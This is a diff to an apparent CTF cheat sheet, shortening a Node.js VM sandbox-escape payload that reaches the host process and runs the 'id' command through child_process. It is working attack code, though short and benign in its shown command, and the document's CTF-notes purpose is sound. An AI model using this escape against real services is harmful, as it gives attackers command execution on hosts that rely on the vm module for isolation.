@@ -18,8 +18,7 @@ Handy bits for CTFs and life
 
 Escape Node VM Sandbox
 
-    const process = this.constructor.constructor("return this.process")();
-    output=process.mainModule.require("child_process").execSync("id").toString()
+    output=this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()
 
 ### Enfiltrate
 
